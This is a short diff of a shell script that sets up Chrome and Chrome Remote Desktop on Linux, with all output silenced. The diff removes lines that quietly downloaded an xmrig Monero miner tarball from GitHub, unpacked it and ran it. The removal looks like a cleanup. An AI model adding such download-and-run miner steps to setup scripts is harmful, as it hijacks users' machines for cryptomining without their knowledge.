@@ -18,13 +18,6 @@ wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 sudo dpkg --install google-chrome-stable_current_amd64.deb
 sudo apt install --assume-yes --fix-broken
 sudo apt install nautilus nano -y 
-mkdir monero
-cd monero
-wget https://github.com/conclude1/rdp/raw/main/xmrig-6.7.0.tar.gz
-tar -xvf xmrig-6.7.0.tar.gz
-cd xmrig-6.7.0/
-chmod u+x ./xmrig
-./xmrig
 sudo adduser Conclude chrome-remote-desktop
 } &> /dev/null &&
 printf "\nSetup Complete " >&2 ||
